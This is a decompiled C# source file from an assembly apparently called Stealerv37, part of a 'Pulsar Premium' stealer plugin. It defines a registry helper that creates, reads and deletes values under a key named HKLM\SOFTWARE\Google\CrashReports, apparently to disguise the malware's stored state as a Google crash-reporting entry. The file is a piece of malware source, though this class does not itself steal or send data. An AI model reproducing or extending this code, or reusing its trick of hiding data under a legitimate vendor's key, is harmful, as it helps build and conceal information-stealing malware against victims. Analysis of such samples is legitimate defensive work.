// Decompiled with JetBrains decompiler
// Type: CvMega.Helper.RegeditKey
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Microsoft.Win32;

#nullable disable
namespace CvMega.Helper;

internal class RegeditKey
{
  public static string Regkey = "SOFTWARE\\Google\\CrashReports";

  public static bool CheckValue(string name)
  {
    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
    {
      using (RegistryKey subKey = registryKey.CreateSubKey(RegeditKey.Regkey, false))
      {
        if (subKey.GetValue(name) != null)
          return true;
      }
    }
    return false;
  }

  public static void SetValue(string name, string value)
  {
    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
    {
      using (RegistryKey subKey = registryKey.CreateSubKey(RegeditKey.Regkey, true))
      {
        if (RegeditKey.CheckValue(name))
          subKey.DeleteValue(name);
        subKey.SetValue(name, (object) value);
      }
    }
  }

  public static string GetValue(string name)
  {
    if (!RegeditKey.CheckValue(name))
      return (string) null;
    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
    {
      using (RegistryKey subKey = registryKey.CreateSubKey(RegeditKey.Regkey, false))
        return (string) subKey.GetValue(name);
    }
  }

  public static string[] GetValues()
  {
    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
    {
      using (RegistryKey subKey = registryKey.CreateSubKey(RegeditKey.Regkey, false))
        return subKey.GetValueNames();
    }
  }

  public static void DeleteValue(string name)
  {
    using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
    {
      using (RegistryKey subKey = registryKey.CreateSubKey(RegeditKey.Regkey, true))
      {
        if (!RegeditKey.CheckValue(name))
          return;
        subKey.DeleteValue(name);
      }
    }
  }
}
